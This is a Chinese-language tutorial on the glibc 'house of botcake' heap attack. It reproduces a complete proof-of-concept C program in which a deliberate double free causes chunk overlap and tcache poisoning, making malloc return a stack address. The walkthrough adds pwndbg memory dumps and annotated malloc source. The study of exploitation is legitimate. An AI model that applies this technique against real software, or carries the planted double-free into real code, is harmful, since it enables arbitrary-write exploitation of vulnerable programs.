# 前言
这一小节我们来看house of botcake这种攻击方式。

# POC
## POC源码
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/
    
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
    
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");
    
    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
```

## POC分析
首先我们先对代码第37行下断点，开始进行调试：

```c
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
```

```c
pwndbg> x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(malloc)
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(malloc)
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(malloc)
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(malloc)
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(malloc)
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(malloc)
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
......
0x5555557579c0:	0x0000000000000000	0x0000000000020641 #top_chunk
......
0x555555757ae0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后创建一个堆块用来准备之后的整理工作（b 39->c）：

```c
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
```

```c
pwndbg> x/350gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(malloc)
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(malloc)
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(malloc)
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(malloc)
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(malloc)
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(malloc)
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_prev(malloc)
......
0x555555757ad0:	0x0000000000000000	0x0000000000020531 #top_chunk
pwndbg> 
```

接下来我们创建两个堆块：chunk_victim和阻止和top_chunk合并的chunk（b 46->c）：

```c
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
```

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(malloc)
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(malloc)
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(malloc)
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(malloc)
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(malloc)
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(malloc)
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_prev(malloc)
......
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(malloc)
......
0x555555757be0:	0x0000000000000000	0x0000000000000021 #chunk(avoid top chunk)
0x555555757bf0:	0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来开始对heap chunk进行攻击，首先释放7个堆块填满对应大小的tcachebin（b 51->c）：

```c
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620894249004-3999379d-5836-4012-8e3e-e4112a9e936a.png)

然后我们释放chunk_victim堆块让其进入unsortedbin中（b 54->c）：

```c
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620894312419-bee51936-27e7-4699-8611-f4fb62dd548b.png)

现在的内存状况如下：

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
......
0x5555557570c0:	0x0000000000000000	0x00005555557578c0
......    
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(free-tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(free-tcachebin)
0x555555757370:	0x0000555555757260	0x0000555555757010
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(free-tcachebin)
0x5555557578c0:	0x00005555557577b0	0x0000555555757010
......
0x5555557579c0:	0x0000000000000000	0x0000000000000111 #chunk_prev(malloc)
......
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-unsortedbin)
0x555555757ae0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
......
0x555555757be0:	0x0000000000000110	0x0000000000000020 #chunk(avoid top chunk)
0x555555757bf0:	0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来我们释放chunk_prev，释放过后chunk_prev会和chunk_victim合并（b 57->c）：

> 这里在释放过程中使用了堆块的向前合并，具体malloc源代码如下：
>

```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
		......(省略堆块向后合并代码)
    }

    if (nextchunk != av->top) { //准备开始堆块的向前合并
        //进入此if语句
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//获取nextchunk的PREV_INUSE标志位
		//nextinuse==0
      /* consolidate forward */
        //堆块的向前合并
      if (!nextinuse) { //nextinuse==0
	unlink(av, nextchunk, bck, fwd); //正常的unlink
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);
	//省略一些无意义的代码......
    }
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620895356363-8f0cdcfd-9906-45ad-ae8c-9d1286d27c6c.png)

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
......
0x5555557570c0:	0x0000000000000000	0x00005555557578c0
......    
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(free-tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(free-tcachebin)
0x555555757370:	0x0000555555757260	0x0000555555757010
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(free-tcachebin)
0x5555557578c0:	0x00005555557577b0	0x0000555555757010
......
0x5555557579c0:	0x0000000000000000	0x0000000000000221 #chunk_prev(free-unsortedbin)---
    								#changed										  |
0x5555557579d0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0								  |
    			#changed			#changed										  |
......																chunk_prev范围 ----|
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-unsortedbin)|
									#注意：这里的size并不会清空						   ｜
0x555555757ae0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0 #这里的指针并不会清空			    |
......																				  |
0x555555757be0:	0x0000000000000220	0x0000000000000020 #chunk(avoid top chunk)--------| 
    			#changed
0x555555757bf0:	0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来我们在申请一个大小为0x100的堆块（b 60->c），这个堆块会从tcachebin中取得：

```c
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620952259763-0457be03-6e4d-4f51-80ca-0d672b27c9b5.png)

接下来我们将再次对chunk_victim进行free（b 64->c）：

> **这里注意，在此次free之前（chunk_victim）已经被free**
>

```c
    /*VULNERABILITY*/
    free(a);// a is already freed //free(a)==free(chunk_victim)
    /*VULNERABILITY*/
```

这一步十分的重要，这里选择引入malloc源码进行调试，进入_int_free函数之后看一下程序的栈帧：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620952450250-061e2a58-d4cc-496b-882d-84f1803c6693.png)

在之前的堆块合并过程中由于chunk_victim的size并没有被清空，且在此POC中存在UAF漏洞，我们可以再次对chunk_victim进行free，此堆块free之后会进入tcachebin中：

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx]; //检测double free
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
#pwndbg> bin
#tcachebins
#0x110 [  7]: 0x555555757ae0 —▸ 0x5555557577b0 —▸ 0x5555557576a0 —▸ 0x555555757590 —▸ 0x555555757480 —▸ 0x555555757370 —▸ 0x555555757260 ◂— 0x0
#fastbins
#0x20: 0x0
#0x30: 0x0
#0x40: 0x0
#0x50: 0x0
#0x60: 0x0
#0x70: 0x0
#0x80: 0x0
#unsortedbin
#all: 0x5555557579c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555557579c0
#smallbins
#empty
#largebins
#empty
#pwndbg>
```

> 在此上述过程中会检测double free，但是这个double free查找的只是tcachebin中是否进行了二次释放，并不会检测此堆块是否在不同的bin中有二次释放，比如：无法检测堆块是否同时存在于tcachebin和unsortedbin。
>

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
......
0x5555557570c0:	0x0000000000000000	0x0000555555757ae0
......    
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(free-tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(free-tcachebin)
0x555555757370:	0x0000555555757260	0x0000555555757010
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
0x5555557578c0:	0x00005555557577b0	0x0000000000000000
......
0x5555557579c0:	0x0000000000000000	0x0000000000000221 #chunk_prev(free-unsortedbin)---
0x5555557579d0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0								  |
								 													  |
......																chunk_prev范围 ----|
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-unsortedbin)|
													   #chunk_victim(free-tcachebin)  ｜
0x555555757ae0:	0x00005555557577b0	0x0000555555757010								  |
    			#changed			#changed		         						  |
#0x555555757ae0:0x00007ffff7dcdca0	0x00007ffff7dcdca0								  |
......																				  |
0x555555757be0:	0x0000000000000220	0x0000000000000020 #chunk(avoid top chunk)--------|   
0x555555757bf0:	0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg>  
```

接下来我们malloc大小为0x120的堆块，此次申请会对unsortedbin的chunk_prev和chunk_victim这个整体进行切割并且覆盖chunk_victim的指针（b 71->c）：

```c
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);

```

这里仍然选择引入源码调试，首先malloc会对unsortedbin中的free chunk--chunk_prev进行整理，根据前面的经验可以知道最终这个堆块被整理到了smallbin中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620957251708-340ac024-29e0-4c8a-b92b-cae907727cec.png)

现在largebin中没有合适的堆块，因此会使用binmap进行遍历：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620957627279-1a84d5b9-0bce-4713-892a-4a14e75e925c.png)

经过binmap的遍历之后程序会使用刚刚放入smallbin的free chunk：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620957733442-19ed0ce5-bade-49dc-9503-443b5d414556.png)

之后会对victim进行unlink：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620958000950-cc8ec18b-d83f-4b4e-896c-ca3ea835f828.png)

unlink后会对那个堆块进行切割并设置last_remainder；

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620958178055-523a0cf1-1bb4-485d-b376-233b9337387c.png)

现在的内存状况如下：

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
......
0x5555557570c0:	0x0000000000000000	0x0000555555757ae0
......    
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(free-tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(free-tcachebin)
0x555555757370:	0x0000555555757260	0x0000555555757010
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
0x5555557578c0:	0x00005555557577b0	0x0000000000000000
......
0x5555557579c0:	0x0000000000000000	0x0000000000000131 #chunk_prev(malloc)-------------
    							   #0x0000000000000221								  ｜
0x5555557579d0:	0x00007ffff7dcdeb0	0x00007ffff7dcdeb0				                  |				
    			#changed			#changed										  |
......																chunk_prev范围 ----|
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-tcachebin)  |
0x555555757ae0:	0x00005555557577b0	0x0000555555757010   							  ｜
0x555555757af0:	0x0000000000000000	0x00000000000000f1 #unsortedbin_chunk--------------|  						  
0x555555757b00:	0x00007ffff7dcdca0	0x00007ffff7dcdca0				
......																				
0x555555757be0:	0x00000000000000f0	0x0000000000000020 #chunk(avoid top chunk)
    			#changed
0x555555757bf0:	0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg>  
```

程序返回之后会继续执行如下代码：

```c
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
```

由于现在堆块chunk_prev处于malloc状态的，也就是说其user_data可写，并且这个堆块是包含处于free状态下chunk_victim，现在我们可以通过chunk_prev来修改chunk_victim的内容，这里修改tcache的next指针，让其指向stack上：

```c
pwndbg> x/400gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
0x555555757010:	0x0000000000000000	0x0700000000000000
......
0x5555557570c0:	0x0000000000000000	0x0000555555757ae0
......    
0x555555757250:	0x0000000000000000	0x0000000000000111 #chunk0(free-tcachebin)
0x555555757260:	0x0000000000000000	0x0000555555757010
......
0x555555757360:	0x0000000000000000	0x0000000000000111 #chunk1(free-tcachebin)
0x555555757370:	0x0000555555757260	0x0000555555757010
......
0x555555757470:	0x0000000000000000	0x0000000000000111 #chunk2(free-tcachebin)
0x555555757480:	0x0000555555757370	0x0000555555757010
......
0x555555757580:	0x0000000000000000	0x0000000000000111 #chunk3(free-tcachebin)
0x555555757590:	0x0000555555757480	0x0000555555757010
......
0x555555757690:	0x0000000000000000	0x0000000000000111 #chunk4(free-tcachebin)
0x5555557576a0:	0x0000555555757590	0x0000555555757010
......
0x5555557577a0:	0x0000000000000000	0x0000000000000111 #chunk5(free-tcachebin)
0x5555557577b0:	0x00005555557576a0	0x0000555555757010
......
0x5555557578b0:	0x0000000000000000	0x0000000000000111 #chunk6(malloc)
0x5555557578c0:	0x00005555557577b0	0x0000000000000000
......
0x5555557579c0:	0x0000000000000000	0x0000000000000131 #chunk_prev(malloc)-------------  
......																                  |
0x555555757ad0:	0x0000000000000000	0x0000000000000111 #chunk_victim(free-tcachebin)  |
0x555555757ae0:	0x00007fffffffdd80	0x0000555555757010   							  ｜
			   #0x00005555557577b0													  |
0x555555757af0:	0x0000000000000000	0x00000000000000f1 #unsortedbin_chunk-------------|  						  
0x555555757b00:	0x00007ffff7dcdca0	0x00007ffff7dcdca0				
......																				
0x555555757be0:	0x00000000000000f0	0x0000000000000020 #chunk(avoid top chunk)
0x555555757bf0: 0x0000000000000000	0x0000000000000000
0x555555757c00:	0x0000000000000000	0x0000000000020401 #top_chunk
......
0x555555757c70:	0x0000000000000000	0x0000000000000000
pwndbg>  
```

因为我问修改的是最后插入tcachebin的free chunk的next指针，因此原来的tcachebin链表已不存在：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620960241267-a6c1f7d9-f929-4de0-a43e-ee9e8f254fb0.png)

当我们再次malloc两次时会控制栈上的地址（tcache_get中没有任何的安全性检查，所以这里很顺利😂）

```c
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620960947062-873ad751-e9f2-4619-b031-ff579d4daac1.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620978821413-9014ea05-06e2-4d6c-ad60-152a7525d6c1.png)

# 漏洞利用（POC总结）
1. 首先malloc 7个大小在tcachebin中的堆块，然后再次malloc相同两个大小的堆块：chunk_prev和chunk_victim。
2. 然后free申请的前7个堆块让其进入到tcachebin中，填满tcachebin
3. 然后我们free掉chunk_victim堆块，让其进入到unsortedbin中
4. 之后free chunk_prev，此时堆块发生向前合并，chunk_prev会和之前释放的chunk_victim进行合并
5. 我们再次malloc与之前相同大小的堆块，此次申请会使用tcachebin中的free chunk，现在tcachebin中剩余6个free chunk，然后我们再次free chunk_victim让其进入到tcachebin中。
6. 然后申请比之前malloc稍微大一点的堆块，这个堆块会对之前合并的unsortedbin进行切割，切割完成后chunk_victim的next指针已经可控
7. 修改chunk_victim的next指针到target（目标地址），再次malloc两次之后即可控制。

> **<font style="color:#F5222D;">核心思想：让chunk_victim即处于tcachebin又处于unsortedbin中</font>**
>

# 疑问
我可以把POC中的step3和step4颠倒吗？

```c
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);

    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
```

当然可以，因为这两个堆块时相邻的，无论free这两个堆块顺序是怎样的，两个堆块free之后都会发生向前合并或向后合并，因此这对这种攻击方式不会产生任何影响：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620978861714-fa598647-3932-4938-a44a-894b122c9914.png)

